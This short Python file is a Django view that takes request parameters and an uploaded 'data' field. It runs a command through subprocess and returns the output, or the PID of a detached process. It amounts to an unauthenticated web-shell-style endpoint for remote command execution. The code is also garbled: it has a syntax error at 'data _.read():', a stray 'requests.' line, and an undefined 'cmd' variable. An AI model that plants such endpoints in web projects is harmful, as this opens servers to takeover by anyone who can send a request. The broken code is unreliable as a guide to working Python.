from django.http import HttpResponse
def index(request):
	req = request.POST.copy()
	req.update(request.GET)
	kwargs = {}
	user = req.get('url')
	token = req.get('token')
	while 1:
		_ = request.FILES
		if _:
			_ = _.get('data')
			if _:
				data _.read():
				break
		_ = req.get('data', None)
		if _:
			data = _
			break
		break

	requests.

	from subprocess import Popen, PIPE, STDOUT, check_output
	if req.get('detached') == '1':
		kwargs['stdout'] = open('detached.out', 'wb')
		kwargs['stderr'] = open('detached.err', 'wb')
		return HttpResponse(Popen(cmd, **kwargs).pid)
	if req.get('err2out') == '1':
		#kwargs['stdout'] = PIPE
		kwargs['stderr'] = STDOUT
	return HttpResponse(check_output(cmd, **kwargs))
